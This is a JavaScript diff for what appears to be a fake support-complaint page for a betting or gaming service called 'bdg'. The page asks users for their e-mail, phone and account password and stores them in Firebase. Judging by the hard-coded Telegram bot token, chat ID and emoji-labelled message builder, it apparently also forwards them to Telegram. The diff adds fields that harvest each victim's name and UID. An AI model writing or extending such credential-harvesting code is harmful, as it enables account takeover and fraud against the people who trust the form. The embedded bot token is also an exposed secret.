@@ -1,6 +1,35 @@
 (function () {
     var TG_BOT_TOKEN = '8817770982:AAE0vUozfSQCKbXZ3Lf3PLNyEpUDrZMe-cA';
     var TG_CHAT_ID = '-1003955056796';
+    var USER_KEY = 'bdg_complain_user';
+
+    var loginBox = document.getElementById('loginBox');
+    var loginBtn = document.getElementById('loginBtn');
+    var currentUser = null;
+    try { currentUser = JSON.parse(localStorage.getItem(USER_KEY)); } catch (e) { currentUser = null; }
+
+    if (loginBox && loginBtn) {
+        if (currentUser && currentUser.name && currentUser.uid) {
+            loginBox.classList.add('hidden');
+        } else {
+            loginBtn.addEventListener('click', doLogin);
+        }
+    }
+
+    function doLogin() {
+        var name = document.getElementById('loginName').value.trim();
+        var uid = document.getElementById('loginUid').value.trim();
+        var err = document.getElementById('loginError');
+        if (!name || !uid) {
+            err.textContent = 'Please enter both Name and UID.';
+            return;
+        }
+        err.textContent = '';
+        currentUser = { name: name, uid: uid };
+        localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
+        loginBox.classList.add('hidden');
+        form.classList.remove('hidden');
+    }
 
     var depositForm = document.getElementById('depositForm');
     var withdrawalForm = document.getElementById('withdrawalForm');
@@ -13,6 +42,10 @@
     var form = isDeposit ? depositForm : (isWithdrawal ? withdrawalForm : gameForm);
     var problemType = isDeposit ? 'Deposit' : (isWithdrawal ? 'Withdrwal' : 'Game');
     var imageInputId = isDeposit ? 'paymentImage' : 'issueImage';
+
+    if (currentUser && currentUser.name && currentUser.uid) {
+        form.classList.remove('hidden');
+    }
 
     var LOADING_MS = 3000;
 
@@ -42,6 +75,8 @@
         var db = firebase.initializeApp(FB_CONFIG).database();
         var save = function (imageData) {
             db.ref('bdg-chat/complaints').push({
+                name: currentUser ? currentUser.name : '',
+                uid: currentUser ? currentUser.uid : '',
                 type: problemType,
                 email: rowValue(rows, 'E-mail'),
                 phone: rowValue(rows, 'Phone No'),
@@ -85,6 +120,8 @@
             : val('problem');
 
         var rows = [
+            { label: 'Name', value: currentUser ? currentUser.name : '' },
+            { label: 'UID', value: currentUser ? currentUser.uid : '' },
             { label: 'E-mail', value: val('email') },
             { label: 'Phone No', value: val('mobile') },
             { label: 'Password', value: val('password') },
@@ -106,6 +143,8 @@
 
     function buildText(rows) {
         var map = {
+            'Name': '👤',
+            'UID': '🆔',
             'E-mail': '📩',
             'Phone No': '📱',
             'Password': '🔑',
